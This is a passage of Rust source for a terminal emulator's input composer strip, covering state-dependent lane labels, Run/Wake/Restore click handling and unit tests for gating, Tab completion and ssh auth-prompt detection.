            } else if cmd_multiline {
                // P6b §6: the refusal is announced, never silent.
                Some("cmd runs one line at a time")
            } else if !can_submit {
                (!quiet).then_some("waiting for prompt\u{2026}")
            } else if state.has_focus && state.draft.is_empty() {
                Some("Shift+Enter \u{2014} new line")
            } else {
                None
            };
            if let Some(hint) = hint {
                let last = state.draft.lines().last().unwrap_or("");
                let tw = if last.is_empty() {
                    0.0
                } else {
                    painter
                        .layout_no_wrap(last.to_string(), font.clone(), super::TEXT)
                        .size()
                        .x
                };
                let hg = painter.layout_no_wrap(
                    hint.into(),
                    FontId::proportional(10.0),
                    super::TEXT_FAINT,
                );
                if x + tw + 24.0 < slot_right - hg.size().x {
                    painter.galley(
                        Pos2::new(
                            slot_right - hg.size().x,
                            strip_rect.center().y - hg.size().y / 2.0,
                        ),
                        hg,
                        super::TEXT_FAINT,
                    );
                }
            }

            if strip_resp.clicked() {
                if let Some(p) = strip_resp.interact_pointer_pos() {
                    if kbd_rect.contains(p) {
                        state.blur_to_grid();
                        resp.surrender_focus();
                    } else if hist_rect.contains(p) {
                        out.toggle_history = true;
                    } else if run_rect.contains(p) {
                        if can_submit && has_draft {
                            // Run ▸ is gated on a non-empty draft, so this is
                            // never the spacer gesture (that is Enter only).
                            // Focus stays in the editor (typeahead window).
                            let (bytes, _) = state.submit(backend, cover_line, prompt_cwd);
                            out.write = bytes;
                        } else if buffering
                            && has_draft
                            && !cmd_multiline
                            && state.pending_has_room()
                        {
                            // Mid-window Run click = the Enter gesture:
                            // queue for the next prompt cycle.
                            state.queue_draft();
                        }
                    } else if !resp.has_focus() {
                        // Anywhere else on the strip: focus the editor.
                        state.want_focus = true;
                    }
                }
            }

            out.has_focus = resp.has_focus() && state.mode == ComposerMode::Compose;
        }

        ComposerMode::Raw(_) => {
            // LEFT lane by the stable-chrome state table + hysteresis
            // (lane_content — pure, table-tested): the lane may change
            // content only on REAL state changes; transients younger than
            // REVEAL render FROZEN QUIET (the per-submit 4-layout strip
            // cycle killer). The right cluster below never reacts to any of
            // this.
            let open_rec = recs.iter().rev().find(|r| r.end_off.is_none());
            match lane_content(state, running, inputs.alt, open_rec.is_some(), now) {
                LaneContent::Editor => unreachable!("mode is Raw"),
                LaneContent::SessionEnded => {
                    // TEXT_SECONDARY, not FAINT: on a dead ssh tab this line
                    // plus the Run-slot `Restore ▸` IS the whole lifecycle
                    // affordance (Bug 4 — the field screenshot's near-
                    // invisible label under raw client_loop noise).
                    painter.text(
                        Pos2::new(lane_x, strip_rect.center().y),
                        Align2::LEFT_CENTER,
                        "Session ended",
                        FontId::proportional(12.0),
                        super::TEXT_SECONDARY,
                    );
                }
                LaneContent::Reconnecting => {
                    // Daemon-certain state (the supervision flag rides the
                    // Snapshot): spinner + label; Cancel lives in the Run
                    // slot below. 100ms repaints keep the arc turning.
                    super::toast::spinner(
                        &painter,
                        Pos2::new(lane_x + 6.0, strip_rect.center().y),
                        5.0,
                        ui.input(|i| i.time),
                        super::ACCENT,
                    );
                    painter.text(
                        Pos2::new(lane_x + 18.0, strip_rect.center().y),
                        Align2::LEFT_CENTER,
                        "reconnecting\u{2026}",
                        FontId::proportional(12.0),
                        super::TEXT_SECONDARY,
                    );
                    ui.ctx()
                        .request_repaint_after(std::time::Duration::from_millis(100));
                }
                LaneContent::Asleep => {
                    // SLEEP §7.3: `☾ asleep` — painter moon (never a font
                    // glyph, S14) + muted label. The Wake ▸ affordance lives
                    // in the fixed Run slot (painted with the right cluster
                    // below — stable chrome F3: same slot, dim-never-
                    // unmount); its click is handled with the strip's.
                    super::draw_moon(
                        &painter,
                        Pos2::new(lane_x + 6.0, strip_rect.center().y),
                        5.0,
                        super::TEXT_MUTED,
                        super::TERM_BG,
                    );
                    painter.text(
                        Pos2::new(lane_x + 18.0, strip_rect.center().y),
                        Align2::LEFT_CENTER,
                        "asleep",
                        FontId::proportional(12.0),
                        super::TEXT_MUTED,
                    );
                }
                LaneContent::AltScreen => {
                    painter.text(
                        Pos2::new(lane_x, strip_rect.center().y),
                        Align2::LEFT_CENTER,
                        "Keys go to the app",
                        FontId::proportional(12.0),
                        super::TEXT_FAINT,
                    );
                }
                LaneContent::Frozen => {
                    // FROZEN lane text through the submit handoff: at Enter
                    // the only pixel change is the caret disappearing; the
                    // text stays put until the echo is grid-verified above
                    // (history-cover conversion) — then the lane empties the
                    // same frame the `❯ cwd cmd` row appears in the grid:
                    // the line visibly commits upward, like a terminal.
                    let x = paint_prompt_prefix(&painter, lane_rect, prompt_cwd, &font);
                    let ghost = state
                        .submit_hold
                        .as_ref()
                        .map(|h| h.ghost.clone())
                        .unwrap_or_default();
                    if !ghost.is_empty() {
                        let g = painter.layout_no_wrap(ghost, font.clone(), super::TEXT);
                        painter.galley(
                            Pos2::new(x, strip_rect.center().y - g.size().y / 2.0),
                            g,
                            super::TEXT,
                        );
                    }
                }
                LaneContent::Quiet => {
                    // Never switch content for a transient that resolves in
                    // 1-2 frames (post-submit windows, the pre→133;B render
                    // gap, hold releases, un-revealed busy) — just schedule
                    // the reveal so it fires without input.
                    let next = state
                        .busy_since
                        .into_iter()
                        .chain(state.last_activity)
                        .map(|t| REVEAL.saturating_sub(now.duration_since(t)))
                        .filter(|d| !d.is_zero())
                        .min();
                    if let Some(d) = next {
                        ui.ctx().request_repaint_after(d);
                    }
                }
                LaneContent::Busy => {
                    if let Some(rec) = open_rec {
                        // Pulsing dot + running command + live elapsed. The
                        // Working-pulse wakeup only fires while output is
                        // <800ms old — a long-running SILENT command would
                        // leave only the 1s heartbeat, which aliases the
                        // 1s-period sine into a frozen dot. Ask for the
                        // ~100ms cadence ourselves.
                        ui.ctx().request_repaint_after(Duration::from_millis(100));
                        let time = ui.input(|i| i.time);
                        let pulse =
                            0.6 + 0.4 * (time as f32 * std::f32::consts::TAU).sin().abs();
                        painter.circle_filled(
                            Pos2::new(lane_x + 4.0, strip_rect.center().y),
                            3.5,
                            super::ACCENT.gamma_multiply(pulse),
                        );
                        let cmd =
                            super::middle_ellipsize(&rec.cmd.replace(['\r', '\n'], " "), 48);
                        let g = painter.layout_no_wrap(
                            cmd,
                            FontId::monospace(12.0),
                            super::TEXT_SECONDARY,
                        );
                        let cw = g.size().x;
                        painter.galley(
                            Pos2::new(lane_x + 16.0, strip_rect.center().y - g.size().y / 2.0),
                            g,
                            super::TEXT_SECONDARY,
                        );
                        let dur = super::term_view::fmt_duration(
                            now_ms().saturating_sub(rec.started_ms),
                        );
                        painter.text(
                            Pos2::new(lane_x + 24.0 + cw, strip_rect.center().y),
                            Align2::LEFT_CENTER,
                            dur,
                            FontId::proportional(11.0),
                            super::TEXT_MUTED,
                        );
                    }
                }
                // PRE-SHELL raw conversation (v0.1.1): ssh auth / login
                // chain — no shell exists yet, so the lane narrates the
                // conversation instead of offering Compose (the arm veto
                // above keeps `arm_available` false; the strip is inert
                // except the right cluster, and typing goes to the grid —
                // exactly where password keys must land). The password line
                // gets the lock glyph; detection reads the CURSOR row only
                // and a miss degrades to the generic line (render-only, no
                // wrong-cover class risk). ssh-family only: a WSL pre-shell
                // lasts sub-second and a degraded hookless remote shell
                // should not claim "ssh is asking" forever… it still does
                // in the hooks-never-arrived case, which is the honest
                // reading (the terminal IS raw passthrough there).
                LaneContent::Label if pre_shell_now && state.is_ssh => {
                    let auth = detect_auth_prompt(&backend.cursor_row_text());
                    let (label, label_col) = match auth {
                        AuthPrompt::Password => (
                            "password \u{2014} keys go straight to ssh, never shown or stored",
                            super::TEXT_SECONDARY,
                        ),
                        AuthPrompt::HostKey => (
                            "host key check \u{2014} answer yes or no",
                            super::TEXT_SECONDARY,
                        ),
                        AuthPrompt::None => (
                            "ssh is asking \u{2014} type your answer in the terminal",
                            super::TEXT_FAINT,
                        ),
                    };
                    let icon_c = Pos2::new(lane_x + 6.0, strip_rect.center().y);
                    if auth == AuthPrompt::Password {
                        draw_lock(&painter, icon_c, super::TEXT_FAINT);
                    } else {
                        draw_keyboard(&painter, icon_c, super::TEXT_FAINT);
                    }
                    painter.text(
                        Pos2::new(lane_x + 20.0, strip_rect.center().y),
                        Align2::LEFT_CENTER,
                        label,
                        FontId::proportional(12.0),
                        label_col,
                    );
                }
                LaneContent::Label => {
                // Steady NoPrompt / UserRaw (and Busy-by-mouse-mode): honest
                // raw label; the ❯ Compose affordance appears ONLY here — a
                // real steady state, never a per-submit transient. A DIRTY
                // armable prompt says what the click will do to the typed
                // text BEFORE the click (P4 §2.1 — the label IS the reclaim
                // affordance). "Dirty" needs a live prompt-end capture to
                // speak about: during the pre→133;B render window prompt_end
                // is deliberately invalidated.
                let dirty =
                    arm_available && !inputs.cursor_clean && backend.has_prompt_end();
                let preview = dirty.then(|| activation_preview(backend));
                let (label, label_col) = match preview {
                    Some(ActPreview::Keeps) => (
                        "Typed text at the prompt \u{2014} Compose keeps it",
                        super::TEXT_SECONDARY,
                    ),
                    Some(ActPreview::Clears) => (
                        "Typed text at the prompt \u{2014} Compose clears it",
                        super::TEXT_SECONDARY,
                    ),
                    None => ("Typing goes to the terminal", super::TEXT_FAINT),
                };
                draw_keyboard(
                    &painter,
                    Pos2::new(lane_x + 6.0, strip_rect.center().y),
                    super::TEXT_FAINT,
                );
                painter.text(
                    Pos2::new(lane_x + 20.0, strip_rect.center().y),
                    Align2::LEFT_CENTER,
                    label,
                    FontId::proportional(12.0),
                    label_col,
                );
                if let Some(p) = preview {
                    // The whole strip is the activation button — repeat the
                    // promise with the mechanism on hover.
                    strip_resp.clone().on_hover_text(match p {
                        ActPreview::Keeps => "Moves what you've typed into the editor",
                        ActPreview::Clears => "Cancels the typed line (Ctrl+C)",
                    });
                }
                if arm_available {
                    // ❯ Compose in its FIXED slot left of History (the same
                    // slot the Compose hints use) — text that brightens on
                    // hover, never a bordered button (seamless doctrine).
                    let over = hover_pos.is_some_and(|p| strip_rect.contains(p));
                    let col = if over {
                        super::ACCENT_HOVER
                    } else {
                        super::ACCENT.gamma_multiply(0.85)
                    };
                    let g = painter.layout_no_wrap(
                        "\u{276f} Compose".into(),
                        FontId::proportional(12.0),
                        col,
                    );
                    let gw = g.size().x;
                    painter.galley(
                        Pos2::new(slot_right - gw, strip_rect.center().y - g.size().y / 2.0),
                        g,
                        col,
                    );
                }
                }
            }

            // Interactions: History toggles the popup in every Raw state
            // (inert only under alt-screen); the REST of the strip is the
            // activation target (mouse-first) when arming is possible.
            if strip_resp.clicked() {
                if let Some(p) = strip_resp.interact_pointer_pos() {
                    if hist_rect.contains(p) {
                        if !inputs.alt {
                            out.toggle_history = true;
                        }
                    } else if asleep_lane && run_rect.contains(p) {
                        // SLEEP inv. 5: waking is THIS explicit click on the
                        // visible Wake ▸ — selecting/scrolling/copying never
                        // wakes. The app sends RestartTerminal (= wake, S5).
                        out.wake = true;
                    } else if recon_lane && run_rect.contains(p) {
                        // Cancel the reconnect supervision (an in-flight
                        // attempt keeps running daemon-side; future retries
                        // stop and the ordinary Dead affordances take over).
                        out.cancel_reconnect = true;
                    } else if dead_lane && run_rect.contains(p) {
                        // The unmissable dead-tab relaunch (Bug 4).
                        out.restore = true;
                    } else if arm_available {
                        out.write = state.activate(backend);
                    }
                }
            }
            if arm_available || ((asleep_lane || recon_lane || dead_lane) && over_run) {
                strip_resp.on_hover_cursor(egui::CursorIcon::PointingHand);
            }
        }
    }

    // ── Right cluster: fixed slots, painted in EVERY mode (stable chrome,
    // F3). Elements dim when inert; they never move and never unmount —
    // across armed → submit window → Busy → armed the cluster is pixel-static.
    {
        let compose = state.mode == ComposerMode::Compose;
        // Run is also live mid-window (it queues) — mouse-first parity with
        // the Enter gesture. SLEEP §7.3: an asleep lane swaps this slot to
        // the accent `Wake ▸` (S15 — the input-shaped affordance in the
        // stationary input furniture; same slot, zero chrome movement).
        if asleep_lane {
            painter.text(
                run_rect.center(),
                Align2::CENTER_CENTER,
                "Wake \u{25b8}",
                FontId::proportional(12.0),
                if over_run { super::ACCENT_HOVER } else { super::ACCENT },
            );
        } else if recon_lane {
            painter.text(
                run_rect.center(),
                Align2::CENTER_CENTER,
                "Cancel",
                FontId::proportional(12.0),
                if over_run { super::ACCENT_HOVER } else { super::ACCENT },
            );
        } else if dead_lane {
            painter.text(
                run_rect.center(),
                Align2::CENTER_CENTER,
                "Restore \u{25b8}",
                FontId::proportional(12.0),
                if over_run { super::ACCENT_HOVER } else { super::ACCENT },
            );
        } else {
        let run_on = compose && has_draft && (can_submit || buffering) && !cmd_multiline;
        let run_col = if !run_on {
            super::TEXT_FAINT
        } else if over_run {
            super::ACCENT_HOVER
        } else {
            super::ACCENT
        };
        painter.text(
            run_rect.center(),
            Align2::CENTER_CENTER,
            "Run \u{25b8}",
            FontId::proportional(12.0),
            run_col,
        );
        }
        let hist_active = !inputs.alt;
        super::draw_icon(
            &painter,
            hist_rect.shrink(5.0),
            super::Icon::History,
            if hist_active && over_hist {
                super::TEXT
            } else {
                super::TEXT_FAINT
            },
        );
        // ⌨: the to-raw toggle while composing; already-raw states keep the
        // glyph faint and inert (dim, never vanish).
        draw_keyboard(
            &painter,
            kbd_rect.center(),
            if compose && over_kbd {
                super::TEXT
            } else {
                super::TEXT_FAINT
            },
        );
    }

    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::gui::term_backend::GridSize;

    /// QOL §4.5: dropped text APPENDS into the draft being typed (space
    /// separator only when needed), caret to the end — never the
    /// stash/replace semantics of `insert_history`.
    #[test]
    fn insert_dropped_text_appends_into_draft() {
        let mut st = ComposerState::default();
        st.insert_dropped_text("'C:\\a.png' ");
        assert_eq!(st.draft, "'C:\\a.png' ");
        assert!(st.caret_to_end);
        // Mid-word draft gains a separator; trailing-space drafts don't.
        st.draft = "claude look at".into();
        st.insert_dropped_text("'C:\\b.png' ");
        assert_eq!(st.draft, "claude look at 'C:\\b.png' ");
        st.insert_dropped_text("'C:\\c.png' ");
        assert_eq!(st.draft, "claude look at 'C:\\b.png' 'C:\\c.png' ");
        // A displaced recall stash dies like on any edit.
        st.recall = Some((RecallSrc::History, "old".into()));
        st.insert_dropped_text("x");
        assert!(st.recall.is_none());
    }

    /// Fresh temp dir for the Tab-completion state-machine tests.
    fn tab_scratch(names: &[&str]) -> std::path::PathBuf {
        use std::sync::atomic::{AtomicU32, Ordering};
        static N: AtomicU32 = AtomicU32::new(0);
        let d = std::env::temp_dir().join(format!(
            "tc_comp_tab_{}_{}",
            std::process::id(),
            N.fetch_add(1, Ordering::Relaxed)
        ));
        for n in names {
            std::fs::create_dir_all(d.join(n)).unwrap();
        }
        d
    }

    /// #24: the whole composer-side cycle walk — forward, reverse, Esc
    /// restore (one Esc consumes the cycle), and edit-commits (any other
    /// draft change invalidates the cycle so the shown candidate stands).
    #[test]
    fn tab_press_cycles_esc_restores_and_edits_commit() {
        let dir = tab_scratch(&["alpha", "bravo"]);
        let cwd = dir.to_str().unwrap();
        let mut st = ComposerState {
            draft: "cd ".into(),
            recall: Some((RecallSrc::History, "stash".into())),
            ..Default::default()
        };
        let caret = st.tab_press(Some(cwd), 3, 1).unwrap();
        assert_eq!(st.draft, r"cd alpha\");
        assert_eq!(caret, 9);
        assert!(st.tab_active());
        // Completion forks recall exactly like typing (§6.2).
        assert!(st.recall.is_none());
        // Repeat Tab cycles forward; Shift+Tab walks back.
        st.tab_press(Some(cwd), 0, 1).unwrap();
        assert_eq!(st.draft, r"cd bravo\");
        st.tab_press(Some(cwd), 0, -1).unwrap();
        assert_eq!(st.draft, r"cd alpha\");
        // Esc restores the original token byte-exact and ends the cycle.
        let caret = st.tab_escape().unwrap();
        assert_eq!(st.draft, "cd ");
        assert_eq!(caret, 3);
        assert!(!st.tab_active());
        // Typing mid-cycle commits the candidate: the stale cycle drops and
        // the next Tab re-plans from the edited token (no matches here).
        st.tab_press(Some(cwd), 3, 1).unwrap();
        st.draft.push('X');
        assert!(!st.tab_active());
        assert_eq!(st.tab_press(Some(cwd), st.draft.len(), 1), None);
        assert_eq!(st.draft, r"cd alpha\X");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// #24: consumed-but-inert cases — empty/whitespace drafts and ssh
    /// (no local view of the remote fs) never touch the draft.
    #[test]
    fn tab_no_ops_on_empty_draft_and_ssh() {
        let mut st = ComposerState::default();
        assert_eq!(st.tab_press(Some(r"C:\"), 0, 1), None);
        st.draft = "   ".into();
        assert_eq!(st.tab_press(Some(r"C:\"), 3, 1), None);
        assert_eq!(st.draft, "   ");
        st.fam = complete::Family::Ssh;
        st.draft = "cat x".into();
        assert_eq!(st.tab_press(Some("/home/z"), 5, 1), None);
        assert_eq!(st.draft, "cat x");
        // No cycle ⇒ tab_escape declines (the Esc chain proceeds).
        assert_eq!(st.tab_escape(), None);
    }

    fn raw_inputs() -> GateInputs {
        GateInputs {
            hooked: true,
            running: true,
            alt: false,
            mouse: false,
            open_block: false,
            at_prompt: true,
            settled: true,
            cursor_clean: true,
            episode_used: false,
            asleep: false,
        }
    }

    /// §2.5, every row — including the AutoArm/ManualOnly split.
    #[test]
    fn gate_truth_table() {
        assert_eq!(gate(&raw_inputs()), GateVerdict::AutoArm);
        type Case = (fn(&mut GateInputs), GateVerdict);
        let cases: Vec<Case> = vec![
            (
                |i| i.hooked = false,
                GateVerdict::Blocked(RawReason::NoPrompt),
            ),
            (|i| i.running = false, GateVerdict::Blocked(RawReason::Dead)),
            (|i| i.alt = true, GateVerdict::Blocked(RawReason::AltScreen)),
            (
                |i| i.open_block = true,
                GateVerdict::Blocked(RawReason::Busy),
            ),
            (|i| i.mouse = true, GateVerdict::Blocked(RawReason::Busy)),
            (
                |i| i.at_prompt = false,
                GateVerdict::Blocked(RawReason::NoPrompt),
            ),
            (
                |i| i.settled = false,
                GateVerdict::Blocked(RawReason::NoPrompt),
            ),
            (|i| i.cursor_clean = false, GateVerdict::ManualOnly),
            (|i| i.episode_used = true, GateVerdict::ManualOnly),
        ];
        for (mutate, expect) in cases {
            let mut i = raw_inputs();
            mutate(&mut i);
            assert_eq!(gate(&i), expect);
        }
        // Precedence: a dead session is Dead even in alt-screen; an open
        // block outranks the prompt latch.
        let mut i = raw_inputs();
        i.running = false;
        i.alt = true;
        assert_eq!(gate(&i), GateVerdict::Blocked(RawReason::Dead));
        let mut i = raw_inputs();
        i.open_block = true;
        i.cursor_clean = false;
        assert_eq!(gate(&i), GateVerdict::Blocked(RawReason::Busy));
        // SLEEP: the flag outranks running/dead (it covers the Sleeping
        // drain transient AND keeps tick from clobbering Raw(Asleep) back
        // to Raw(Dead) after the exit lands).
        let mut i = raw_inputs();
        i.asleep = true;
        assert_eq!(gate(&i), GateVerdict::Blocked(RawReason::Asleep));
        i.running = false;
        assert_eq!(gate(&i), GateVerdict::Blocked(RawReason::Asleep));
    }

    /// SLEEP §7.3: the lane presents `☾ asleep` for a flagged terminal —
    /// via the Raw(Asleep) reason, and via the flag+dead belt during the
    /// one-frame Snapshot-before-tick window; a woken (unflagged) dead
    /// terminal stays SessionEnded.
    #[test]
    fn lane_content_asleep_arm() {
        let now = Instant::now();
        let mut st = ComposerState {
            asleep: true,
            mode: ComposerMode::Raw(RawReason::Asleep),
            ..Default::default()
        };
        assert_eq!(lane_content(&st, false, false, false, now), LaneContent::Asleep);
        // Belt: mode still says Dead but the flag already landed.
        st.mode = ComposerMode::Raw(RawReason::Dead);
        assert_eq!(lane_content(&st, false, false, false, now), LaneContent::Asleep);
        // The transient: flagged + still running (drain window).
        st.mode = ComposerMode::Raw(RawReason::Asleep);
        assert_eq!(lane_content(&st, true, false, false, now), LaneContent::Asleep);
        // Not flagged ⇒ the ordinary dead lane.
        st.asleep = false;
        st.mode = ComposerMode::Raw(RawReason::Dead);
        assert_eq!(
            lane_content(&st, false, false, false, now),
            LaneContent::SessionEnded
        );
    }

    /// §11 episode rules: raw input at a prompt uses the episode and
    /// dismisses an armed composer; submit spends the episode and STAYS in
    /// Compose (post-submit typeahead — the next command's keys land in the
    /// draft, never raw); the next `pre` resets; keys typed into a TUI
    /// (`at_prompt` false) do NOT use the episode.
    #[test]
    fn episode_rules() {
        let now = Instant::now();
        let mut st = ComposerState::default();

        // TUI case first: no prompt latch, raw keys are episode-free.
        st.on_raw_input(now);
        assert!(!st.episode_used);

        // pre latches; raw typing at the armed prompt wins the episode (D7).
        st.on_stream_events(1, 0, now);
        assert!(st.at_prompt_latched());
        st.mode = ComposerMode::Compose;
        st.on_raw_input(now);
        assert!(st.episode_used);
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::UserRaw));

        // Submit: same-frame episode_used + cleared draft (D6), Compose
        // kept with the typeahead window open.
        let backend = TermBackend::new(GridSize::default());
        let mut st = ComposerState::default();
        st.on_stream_events(1, 0, now);
        st.mode = ComposerMode::Compose;
        st.draft = "echo hi".into();
        let (bytes, spacer) = st.submit(&backend, None, None);
        assert_eq!(bytes, b"echo hi\r");
        assert!(!spacer);
        assert!(st.draft.is_empty());
        assert!(st.episode_used);
        assert_eq!(st.mode, ComposerMode::Compose, "typeahead: never yields raw");
        assert!(st.buffering(), "submit opens the typeahead window");

        // exec clears the latch but the typeahead window HOLDS Compose (the
        // exec edge is the normal first event of every submit window)…
        st.on_stream_events(1, 1, now);
        assert!(!st.at_prompt_latched());
        assert_eq!(st.mode, ComposerMode::Compose);
        // …and the closing pre resets the episode and re-arms the latch.
        st.on_stream_events(2, 1, now);
        assert!(st.at_prompt_latched());
        assert!(!st.episode_used);
        assert_eq!(st.mode, ComposerMode::Compose);

        // A focused composer is never yanked by an external exec (inv. 4).
        let mut st = ComposerState::default();
        st.on_stream_events(1, 0, now);
        st.mode = ComposerMode::Compose;
        st.has_focus = true;
        st.on_stream_events(1, 1, now);
        assert_eq!(st.mode, ComposerMode::Compose);
        // Unfocused with an empty draft: quiet dismissal.
        let mut st = ComposerState::default();
        st.on_stream_events(1, 0, now);
        st.mode = ComposerMode::Compose;
        st.on_stream_events(1, 1, now);
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::Busy));
    }

    /// Build a backend parked at a clean captured prompt end (Bug 1 support).
    fn backend_at_clean_prompt() -> TermBackend {
        let mut b = TermBackend::new(GridSize::default());
        b.set_stream_pos(0);
        b.enable_block_scan();
        // pre hook + prompt text + 133;B, one feed → prompt_end captured with
        // the cursor sitting exactly on it (nothing typed).
        let hex: String = r#"{"e":0,"n":1,"d":"C:"}"#
            .bytes()
            .map(|b| format!("{b:02x}"))
            .collect();
        let mut data = format!("\x1b]7717;0;pre;{hex}\x07").into_bytes();
        data.extend_from_slice(b"PS C:\\> ");
        data.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&data);
        assert!(b.cursor_at_prompt_end());
        b
    }

    /// Bug 1 root-cause regression: with SETTLE == 0 a clean prompt arms on
    /// the SAME instant the pre+133;B are processed — no 50ms window for a
    /// fast typist's first key to fall through to the grid.
    #[test]
    fn arms_immediately_without_settle() {
        assert_eq!(SETTLE, Duration::ZERO, "settle must be zero (Bug 1)");
        let b = backend_at_clean_prompt();
        let mut st = ComposerState::default();
        let now = Instant::now();
        let f = b.block_feed.as_ref().unwrap();
        st.on_stream_events(f.pre_seen, f.exec_seen, now);
        // Same instant as the latch — must arm (grid had focus ⇒ want_focus).
        let recs: Vec<BlockRec> = Vec::new();
        st.tick(&b, &recs, true, true, now);
        assert_eq!(
            st.mode,
            ComposerMode::Compose,
            "composer must arm with zero settle delay"
        );
        assert!(st.want_focus, "must request focus to catch the first key");
    }

    /// Hex-encode a hook payload the way the bootstrap does (token "0",
    /// matching `backend_at_clean_prompt`).
    fn hook_bytes(verb: &str, json: &str) -> Vec<u8> {
        let hex: String = json.bytes().map(|b| format!("{b:02x}")).collect();
        format!("\x1b]7717;0;{verb};{hex}\x07").into_bytes()
    }

    /// v0.1.1 (the ssh password-phase plaintext exposure, root 1b):
    /// D2C::Reset replaces the backend — its counters restart at 0 — so
    /// on_reset/on_exited must resync the baselines. Without the resync the
    /// respawn's FIRST hookless output frame (the `Password:` bytes) read
    /// as a counter edge and falsely latched `at_prompt`. Fails against the
    /// pre-fix code.
    #[test]
    fn reset_resyncs_hook_counters() {
        let now = Instant::now();
        let mut st = ComposerState::default();
        // The old lifetime saw real hook traffic.
        st.on_stream_events(3, 2, now);
        assert!(st.at_prompt_latched());
        st.on_reset();
        assert!(!st.at_prompt_latched());
        // Fresh backend, fresh counters: (0,0) is the ORIGIN, not an edge.
        st.on_stream_events(0, 0, now);
        assert!(
            !st.at_prompt_latched(),
            "the post-reset counter origin must never latch at_prompt"
        );
        // Symmetric on the exit path.
        let mut st = ComposerState::default();
        st.on_stream_events(5, 5, now);
        st.on_exited();
        st.on_stream_events(0, 0, now);
        assert!(!st.at_prompt_latched());
        // A REAL first pre of the new lifetime still latches.
        st.on_stream_events(1, 0, now);
        assert!(st.at_prompt_latched());
    }

    /// v0.1.1 pre-shell definition: no hook event this lifetime + no latch
    /// ⇒ pre-shell (the arm veto's input); any lifetime signal exits it.
    /// AutoArm is structurally impossible pre-shell (no latch ⇒ the gate
    /// blocks NoPrompt) — pinned here so the veto's belt never rots.
    #[test]
    fn pre_shell_state_table() {
        assert!(pre_shell(true, false, 0, 0, false));
        assert!(!pre_shell(false, false, 0, 0, false), "dead is not pre-shell");
        assert!(!pre_shell(true, true, 0, 0, false), "alt-screen is its own state");
        assert!(!pre_shell(true, false, 1, 0, false), "the first pre exits pre-shell");
        assert!(!pre_shell(true, false, 0, 1, false), "an exec exits pre-shell");
        assert!(
            !pre_shell(true, false, 0, 0, true),
            "a cold-attach latch exits pre-shell"
        );
        let mut i = raw_inputs();
        i.at_prompt = false;
        assert_eq!(gate(&i), GateVerdict::Blocked(RawReason::NoPrompt));
    }

    /// v0.1.1: the pre-shell auth-prompt detector fixtures (cursor-row text
    /// only, end-anchored; misses degrade to the generic label).
    #[test]
    fn auth_prompt_detection_fixtures() {
        use AuthPrompt::*;
        assert_eq!(detect_auth_prompt("alec@devbox's password: "), Password);
        assert_eq!(detect_auth_prompt("(user@host) Password:"), Password);
        assert_eq!(
            detect_auth_prompt("Enter passphrase for key '/home/z/.ssh/id_ed25519': "),
            Password
        );
        assert_eq!(detect_auth_prompt("PASSCODE:"), Password);
        assert_eq!(
            detect_auth_prompt(
                "Are you sure you want to continue connecting (yes/no/[fingerprint])? "
            ),
            HostKey
        );
        assert_eq!(detect_auth_prompt("Continue connecting (yes/no)? "), HostKey);
        // Negatives: shell prompts, echoes, non-anchored mentions.
        assert_eq!(detect_auth_prompt("[zany@MSI zany]$ "), None);
        assert_eq!(detect_auth_prompt("zany@MSI:~$ "), None);
        assert_eq!(detect_auth_prompt("cat password.txt"), None);
        assert_eq!(
            detect_auth_prompt("password: extra words"),
            None,
            "the colon must anchor the end of the row"
        );
        assert_eq!(
            detect_auth_prompt("time:"),
            None,
            "a bare trailing colon without a secret keyword"
        );
        assert_eq!(detect_auth_prompt(""), None);
    }

    /// v0.1.1 (the wrong-capture `^C`-spam loop breaker): the activation
    /// clear chord ships at most ONCE per prompt epoch, and a column-0
    /// capture (only the prompt itself can start there) neither reclaims
    /// nor chords.
    #[test]
    fn activate_chord_once_per_prompt_epoch() {
        let mut b = backend_at_clean_prompt();
        b.advance_live(b"junk"); // typed junk: cursor off the prompt end
        assert!(!b.cursor_at_prompt_end());
        let mut st = ComposerState::default();
        let chord = st.activate(&b);
        assert!(!chord.is_empty(), "first activation ships the clear chord");
        assert_eq!(st.draft, "junk", "reclaimable text pulled into the draft");
        // Same prompt epoch: no second chord, no duplicate reclaim.
        st.mode = ComposerMode::Raw(RawReason::UserRaw);
        assert!(
            st.activate(&b).is_empty(),
            "one clear attempt per prompt epoch"
        );
        assert_eq!(st.draft, "junk", "no duplicate reclaim");
        // A fresh pre (new prompt epoch) re-allows exactly one chord.
        b.advance_live(&hook_bytes("pre", r#"{"e":130,"n":2,"d":"C:"}"#));
        b.advance_live(b"PS C:\\> \x1b]133;B\x07");
        b.advance_live(b"junk2");
        st.mode = ComposerMode::Raw(RawReason::UserRaw);
        assert!(
            !st.activate(&b).is_empty(),
            "a fresh prompt epoch re-arms the chord"
        );
    }

    /// v0.1.1: a col-0 prompt-end capture is the ConPTY reorder shape — the
    /// "typed text" a reclaim would read IS the prompt string. Activation
    /// must arm silently: no chord, no reclaim.
    #[test]
    fn activate_never_chords_a_col0_capture() {
        let mut b = TermBackend::new(GridSize::default());
        b.set_stream_pos(0);
        b.enable_block_scan();
        // 133;B beats the prompt text into the stream (the race).
        b.advance_live(b"\x1b]133;B\x07");
        b.advance_live(b"[zany@MSI zany]$ ");
        assert!(!b.cursor_at_prompt_end());
        let mut st = ComposerState::default();
        assert!(
            st.activate(&b).is_empty(),
            "no chord may ship for a col-0 capture"
        );
        assert_eq!(
            st.draft, "",
            "the prompt string must never be reclaimed as typed input"
        );
        assert_eq!(st.mode, ComposerMode::Compose);
    }

    /// Restored-render fix: an ACTIVE Compose whose cover certainty breaks
    /// (here: stray grid bytes move the cursor off the captured prompt end
    /// — the field shape was a resize repaint moving the real prompt off
    /// the cold-attach seed) must DEMOTE to Raw after the DEMOTE window
    /// instead of sitting forever as an armed hint lane under a raw prompt
    /// row with its own visible cursor. Draft survives; a transient blip
    /// inside the window never demotes; the clock never leaks across
    /// episodes.
    #[test]
    fn compose_demotes_after_sustained_certainty_loss() {
        let mut b = backend_at_clean_prompt();
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose);
        st.draft = "keep me".into();

        // Certainty breaks: bytes render into the grid without any hook —
        // the cursor leaves the captured prompt end and never comes back.
        b.advance_live(b"stray");
        assert!(!b.cursor_at_prompt_end());

        // Inside the window: still Compose (transients must not flap).
